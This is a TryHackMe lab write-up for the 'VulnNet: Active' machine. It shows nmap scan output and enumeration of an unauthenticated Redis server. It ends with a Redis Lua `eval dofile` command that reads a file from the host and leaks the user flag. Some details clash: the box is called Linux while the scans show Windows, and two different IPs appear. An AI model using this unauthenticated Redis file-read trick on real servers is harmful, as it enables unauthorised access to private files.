---
title: "THM - # VulnNet: Active"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # VulnNet: Active"
categories:
  - THM
---

The given box ```VulnNet: Active``` is a Linux machine with an IP address of ```10.10.135.22```

- [TryHackMe- VulnNet:Active](#tryhackme---razorblack)
  - [Recon](#recon)
    - [Nmap Scan Result](#nmap-scan-result)
  - [Enumeration](#enumeration)

## Recon

### Nmap Scan Result

Found ```15 open ports``` in port scan 

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# cat open_ports.txt
Discovered open port 445/tcp on 10.10.25.148
Discovered open port 49667/tcp on 10.10.25.148
Discovered open port 464/tcp on 10.10.25.148
Discovered open port 49665/tcp on 10.10.25.148
Discovered open port 6379/tcp on 10.10.25.148
Discovered open port 53/tcp on 10.10.25.148
Discovered open port 49707/tcp on 10.10.25.148
Discovered open port 49687/tcp on 10.10.25.148
Discovered open port 49669/tcp on 10.10.25.148
Discovered open port 49676/tcp on 10.10.25.148
Discovered open port 9389/tcp on 10.10.25.148
Discovered open port 53/udp on 10.10.25.148
Discovered open port 139/tcp on 10.10.25.148
Discovered open port 49670/tcp on 10.10.25.148
Discovered open port 135/tcp on 10.10.25.148
```

#### **TCP Scan**

```shell
# Nmap 7.92 scan initiated Thu Jul 14 20:55:16 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/_full_tcp_nmap.txt -oX /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/xml/_full_tcp_nmap.xml 10.10.25.148
Nmap scan report for 10.10.25.148
Host is up, received user-set (0.19s latency).
Scanned at 2022-07-14 20:55:17 IST for 383s
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=7/14%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=62D036DC%P=aarch64-unknown-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-14T15:31:03
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 5738/tcp): CLEAN (Timeout)
|   Check 2 (port 21579/tcp): CLEAN (Timeout)
|   Check 3 (port 60176/udp): CLEAN (Timeout)
|   Check 4 (port 45747/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   187.06 ms 10.11.0.1
2   187.52 ms 10.10.25.148

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 14 21:01:40 2022 -- 1 IP address (1 host up) scanned in 384.37 seconds
```

#### **UDP Scan**

```shell
# Nmap 7.92 scan initiated Thu Jul 14 20:55:16 2022 as: nmap -vv --reason -Pn -T4 -sU -A --top-ports 100 -oN /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/_top_100_udp_nmap.txt -oX /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/xml/_top_100_udp_nmap.xml 10.10.25.148
Nmap scan report for 10.10.25.148
Host is up, received user-set (0.23s latency).
Scanned at 2022-07-14 20:55:17 IST for 1770s
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE      REASON               VERSION
53/udp  open  domain       udp-response ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec udp-response         Microsoft Windows Kerberos (server time: 2022-07-14 15:25:32Z)
123/udp open  ntp          udp-response ttl 127 NTP v3
| ntp-info: 
|_  receive time stamp: 2022-07-14T15:32:07
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.92%I=7%D=7/14%Time=62D0357B%P=aarch64-unknown-linux-gnu%
SF:r(NBTStat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAA
SF:AAAAAAAAAAAAA\0\0!\0\x01");
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=7/14%OT=%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=62D03C47%P=aarch64-unknown-linux-gnu)
SEQ(II=I)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s

TRACEROUTE (using port 123/udp)
HOP RTT       ADDRESS
1   183.50 ms 10.11.0.1
2   307.77 ms 10.10.25.148

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 14 21:24:47 2022 -- 1 IP address (1 host up) scanned in 1770.48 seconds
```

### Enumeration

After running ```autorecon tool``` the possible finding is on port  ```6379/tcp  open  redis```  and  ```135/tcp   open  msrpc```

#### **Redis**

Redis is an open source (BSD licensed), in-memory **data structure store**, used as a **database**, cache and message broker. By default and commonly Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement **ssl/tls**.

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# redis-cli -h active.thm
active.thm:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:3760
run_id:f246befe915ef7295f79b60cf4cc1d8379614a9e
tcp_port:6379
uptime_in_seconds:735
uptime_in_days:0
hz:10
lru_clock:13783942
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:952952
used_memory_human:930.62K
used_memory_rss:919408
used_memory_peak:977472
used_memory_peak_human:954.56K
used_memory_lua:36864
mem_fragmentation_ratio:0.96
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1657950375
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:31
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.05
used_cpu_user:0.08
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
active.thm:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
(0.65s)
```

while enumerating got some information on username ```enterprise-security``` from  ```104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"```

From here trying to get the user.txt flag,

```shell
active.thm:6379> eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
(error) ERR Error running script (call to f_e1024ba6b1cf739bebaae913edc392dfdb771779): @user_script:1: cannot open C:Usersenterprise-securityDesktopuser.txt: No such file or directory
active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
```

